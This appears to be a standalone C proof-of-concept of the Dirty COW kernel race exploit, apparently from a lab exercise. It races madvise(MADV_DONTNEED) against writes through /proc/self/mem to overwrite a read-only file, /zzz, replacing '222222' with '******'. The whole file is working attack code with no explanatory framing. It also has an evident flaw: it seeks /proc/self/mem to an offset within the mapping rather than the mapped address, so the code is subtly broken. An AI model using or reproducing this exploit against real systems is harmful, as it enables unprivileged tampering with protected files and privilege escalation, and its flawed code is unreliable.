#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <string.h>
#include <unistd.h>

void *map;

void *madviseThread(void *arg) {
    int file_size = (int) arg;
    while(1) {
        madvise(map, file_size, MADV_DONTNEED);
    }
}

void *writeThread(void *arg) {
    char *content = "******";
    off_t offset = (off_t) arg;
    int f = open("/proc/self/mem", O_RDWR);
    while(1) {
        // Move the file pointer to the corresponding position
        lseek(f, offset, SEEK_SET);
        // Write to the memory
        write(f, content, strlen(content));
    }
}

int main(int argc, char *argv[]) {
    pthread_t pth1, pth2;
    struct stat st;
    int file_size;

    // Open the target file in read-only mode
    int f = open("/zzz", O_RDONLY);
    if (f == -1) {
        perror("Error opening file");
        return 1;
    }

    // Get file size and map the file
    fstat(f, &st);
    file_size = st.st_size;
    map = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);
    if (map == MAP_FAILED) {
        perror("Error mapping file");
        close(f);
        return 1;
    }

    // Find the position of the target string
    char *position = strstr(map, "222222");
    if (position == NULL) {
        printf("Pattern '222222' not found in file\n");
        munmap(map, file_size);
        close(f);
        return 1;
    }

    // Calculate offset
    off_t offset = position - (char *)map;

    // Create the threads
    if (pthread_create(&pth1, NULL, madviseThread, (void *)file_size)) {
        perror("Error creating madvise thread");
        return 1;
    }
    if (pthread_create(&pth2, NULL, writeThread, (void *)offset)) {
        perror("Error creating write thread");
        return 1;
    }

    // Wait for the threads to finish
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    return 0;
}